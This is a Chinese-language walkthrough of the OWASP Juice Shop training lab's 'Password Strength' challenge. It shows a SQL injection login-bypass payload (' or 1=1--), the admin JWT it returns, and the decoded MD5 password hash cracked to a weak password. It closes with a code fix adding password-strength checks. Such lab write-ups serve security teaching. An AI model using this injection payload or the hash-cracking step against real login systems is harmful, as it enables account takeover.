- Password Strength
    - 描述： 使用管理员用户凭证登录，且之前未更改过凭证或应用过SQL注入。
    - 思路：
        - 爆破密码
        - 或使用登录的 SQL 注入设置条件逐位确定散列密码，查表得到明文
        - 或尝试分析登录后得到的 JWT
        - 或查找是否存在可回显的 SQL 注入漏洞
    - 尝试分析 JWT
        - 使用 SQL 注入登录管理员账户
        ```POST /rest/user/login HTTP/1.1```
            ```json
            {
                "email": "' or 1=1--",
                "password": "a"
            }
            ```
        - 响应为
            ```json
            {
                "authentication": {
                    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxNzIuMTcuMC4xIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTEyLTExIDA3OjU5OjU4LjA4NCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTEyLTExIDA4OjM4OjU4Ljg2MyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NjU0NDIzOTd9.VfUV7FiYJaTB7lSvpeeiJC9cl8K3-sQQFxm1LKCziWA_-SbaPPpcKJiAJvgEiq09Jy8OGPQsDozVjJVz-VwIxSi4XYeOHwD4R766hw0jNdJbdZFN3jrIHIZzZNo8AU9WPFASmW0e7gJhQeM9tBXjI3zCkXJ6J5x2HgQxhYRHxEM",
                    "bid": 1,
                    "umail": "admin@juice-sh.op"
                }
            }
            ```
        - 分析 JWT 内容，进行 Base64解码，其中前两部分为
            ```json
            {
                "typ": "JWT",
                "alg": "RS256"
            }
            {
                "status": "success",
                "data": {
                    "id": 1,
                    "username": "",
                    "email": "admin@juice-sh.op",
                    "password": "0192023a7bbd73250516f069df18b500",
                    "role": "admin",
                    "deluxeToken": "",
                    "lastLoginIp": "172.17.0.1",
                    "profileImage": "assets/public/images/uploads/defaultAdmin.png",
                    "totpSecret": "",
                    "isActive": true,
                    "createdAt": "2025-12-11 07:59:58.084 +00:00",
                    "updatedAt": "2025-12-11 08:38:58.863 +00:00",
                    "deletedAt": null
                },
                "iat": 1765442397
            }
            ```
        - 得到管理员账户的密码散列为
        ```0192023a7bbd73250516f069df18b500```
        - 在搜索引擎中找到解密网站对应的 MD5 逆向明文
        ```admin123```
        - 弱密码

- 代码挑战
    ```typescript
    User.init(
        password: {
        type: DataTypes.STRING,
        set (clearTextPassword: string) {
            this.setDataValue('password', security.hash(clearTextPassword))
        }
    },
    ```
    - 创建新账户的代码中，缺乏对密码强度的检测
        ```typescript
        this.setDataValue('password', security.hash(clearTextPassword))
        ```
    - 修复为：在设置前添加对最小长度与常见密码的检测
        ```typescript
        validatePasswordHasAtLeastTenChar(clearTextPassword)
        validatePasswordIsNotInTopOneMillionCommonPasswordsList(clearTextPassword)
        this.setDataValue('password', security.hash(clearTextPassword))
        ```
        > 根据 NIST-800-63B，密码（记忆的秘密）应至少包含八个字符，以防止“在线攻击”。此外，NIST-800-63B 要求密码不能出现在常用字典中。如果您想体验更多关于密钥的乐趣，请访问 OWASP Wrong Secrets：[https://wrongsecrets.fly.dev/](https://wrongsecrets.fly.dev/)，特别是挑战16和23。
    - 尝试选择拥有更复杂的特殊符号/数字/大小写的代码修复时
        > 根据NIST-800-63B，密码（记忆型秘密）应至少包含八个字符以防止'在线攻击'。特殊字符测试的使用是不恰当的（现在不适用了），因为用户倾向于找到已知的方法，例如记有密码的笔记或在末尾添加感叹号来添加特殊字符。